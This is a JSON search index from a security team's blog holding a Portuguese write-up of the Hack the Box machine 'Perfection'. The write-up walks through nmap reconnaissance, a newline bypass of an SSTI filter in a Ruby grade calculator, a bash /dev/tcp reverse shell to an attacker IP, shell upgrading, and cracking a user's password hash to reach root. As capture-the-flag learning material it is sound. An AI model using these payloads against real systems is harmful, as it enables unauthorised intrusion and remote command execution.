[{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/series/ctf/","section":"Series","summary":"","title":"CTF"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/categories/generated/","section":"Categories","summary":"","title":"Generated"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box"},{"content":" 1. Introdução # Coe, aqui estara a descrição dos passos que eu junto à galera da sunsec tomamos para resolver a máquina \u0026ldquo;Perfection\u0026rdquo; do hack the box. E que depois de muita luta (principalmente no bypass do SSTI) nós conseguimos ownar.\nReconhecimento # A princípio, utilizamos o nmap a fim de descobrir as portas sendo utilizadas e os serviços exploravei bem como suas versões\nnmap -sC -sV $target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx |_http-title: Weighted Grade Calculator Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Após analisar o resultado do nmap, nos voltamos para a aplicação web na porta 80. Na qual seguimos mapeando, foi utilizado o wapplizer extrair informações sobre as tecnologias sendo utilizadas na página web e descobrimos que estão utilizando ruby na versão 3.0.2. Além disso, o site foi construido usando o WEBrick 1.7.0. Com tudo que foi recolhido, buscamos por exploits para explorar as versões das tanto do ruby quanto do WEBbrick mas não encontramos nada.\nContinuamos vasculhando à aplicação até esbarrar no seguinte formulário:\n[ ]\nSeguindo o caminho esperado pela aplicação, nós inserimos os dados necessários no formulário e obtivemos como resultado um cálculo de peso.\nYour total grade is 12% sample: 12% N/A: 0% N/A: 0% N/A: 0% N/A: 0% Dado este output, nós percebemos que os dados que nós inserimos estão sendo processados pelo backend da aplicação e está sendo devolvido para o frontend. Com isso em mente, tentamos inserir alguns payloads de XSS/SQLI/SSTI e obtivemos a seguinte a menssagem \u0026ldquo;Malicious input blocked\u0026rdquo; então decidimos investir nesse campo. Focamos nos payloads de SSTI por se tratar de uma app escrita em ruby e esta linguagem ter um péssimo histórico com templates.\nApós batermos cabeça por muito tempo usando vários payloads com os mais diversos encodes possíveis, utilizamos uma técnica de bypass por meio da quebra de linha com o seguinte payload:\nunencoded aa\\n\u0026lt;%= `ls /` %\u0026gt; encoded aa%0a\u0026lt;%25%3d+`ls+/`+%25\u0026gt; Feito isso, agora é possível executar comandos dentro da máquina alvo. Sendo assim tentamos pegamos uma shell reversa alterando o comando para:\nunencoded aa\\n\u0026lt;%= `bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.73/1337 0\u0026gt;\u0026amp;1` %\u0026gt; encoded aa\\n\u0026lt;%25%3d+`bash+-i+\u0026gt;%26+/dev/tcp/10.10.14.73/1337+0\u0026gt;%261`+%25\u0026gt; Agora dentro da máquina alvo fazemos o update da shell\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Vasculhando por informações, encontra-se no diretorio do usuário \u0026ldquo;susan\u0026rdquo; um sub-diretorio de migrations, e utilizando o comando strings nele algumas informação.\nCredenciais da sunsan De posse dessa credencial nós quebrabos a senha com hashcat e a utilizamos para logar como root e pegar a última flag.\n","date":"22 March 2024","externalUrl":null,"permalink":"/posts/perfection/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - Perfection"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/authors/paixao/","section":"Authors","summary":"","title":"Paixao"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/","section":"Sunsec","summary":"","title":"Sunsec"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"}]